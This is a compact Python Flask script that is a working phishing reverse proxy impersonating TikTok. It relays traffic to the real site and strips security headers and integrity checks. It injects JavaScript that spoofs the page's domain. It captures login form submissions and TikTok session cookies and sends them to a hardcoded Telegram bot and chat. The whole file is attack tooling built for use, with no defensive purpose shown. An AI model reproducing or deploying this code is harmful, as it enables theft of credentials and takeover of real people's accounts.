import os,re,urllib3,requests
from flask import Flask,request,make_response,redirect
from urllib.parse import urljoin
from werkzeug.middleware.proxy_fix import ProxyFix
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
a=Flask(__name__)
a.wsgi_app=ProxyFix(a.wsgi_app,x_for=1,x_proto=1,x_host=1,x_prefix=1)
T="8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
C="1367401179"
class P:
 def __init__(s):
  s.t="www.tiktok.com"
  s.e=['sessionid','sid_tt','uid_tt','ttwid','msToken','odin_tt']
 def n(s,m):
  try:requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":m,"parse_mode":"HTML"},timeout=5)
  except:pass
 def i(s,h,o):
  h=h.replace(f'https://{s.t}',f'https://{o}');h=h.replace('www.tiktok.com',o);h=h.replace('Content-Security-Policy','X-Proxy-CSP')
  h=re.sub(r'integrity="[^"]+"','',h)
  j=f"<script>(function(){{const r=window.location.replace;window.location.replace=function(u){{if(u.includes('tiktok.com'))u=u.replace('www.tiktok.com','{o}');window.location.href=u;}};Object.defineProperty(document,'domain',{{get:function(){{return'{s.t}';}}}});}})();</script>"
  return h.replace('<head>',f'<head>{j}')
p=P()
@a.route('/')
def x():return redirect('/login')
@a.route('/<path:q>',methods=['GET','POST','PUT','DELETE','PATCH'])
def y(q):
 o=request.headers.get('Host')
 u=urljoin(f"https://{p.t}",q)
 if request.query_string:u+='?'+request.query_string.decode()
 H={k:v for k,v in request.headers if k.lower() not in ['host','accept-encoding']}
 H['Host']=p.t
 b=request.get_data()
 if request.method=='POST':
  try:
   d=b.decode('utf-8',errors='ignore')
   if any(k in d.lower() for k in ['pass','user','login','email']):p.n(f"🎯 <b>Data:</b>\n<code>{d[:1000]}</code>")
  except:pass
 try:
  r=requests.request(method=request.method,url=u,headers=H,cookies=request.cookies,data=b,allow_redirects=False,verify=False,timeout=30)
  ck=r.cookies.get_dict()
  if 'sessionid' in ck:
   s='; '.join([f"{k}={v}" for k,v in ck.items() if k in p.e])
   p.n(f"🔥 <b>SESSION:</b>\n<code>{s}</code>")
  c=r.content
  if 'text/html' in r.headers.get('Content-Type',''):c=p.i(c.decode('utf-8',errors='ignore'),o).encode()
  res=make_response(c)
  res.status_code=r.status_code
  for k,v in r.headers.items():
   if k.lower() not in ['content-encoding','content-length','content-security-policy','set-cookie']:res.headers[k]=v
  for k,v in r.cookies.items():res.set_cookie(k,v,secure=True,httponly=True,samesite='None',domain=None)
  if r.status_code in [301,302,303,307,308]:
   l=r.headers.get('Location','').replace(p.t,o)
   res.headers['Location']=l
  return res
 except Exception as e:return str(e),500
if __name__=='__main__':a.run(host='0.0.0.0',port=int(os.environ.get('PORT',10000)))
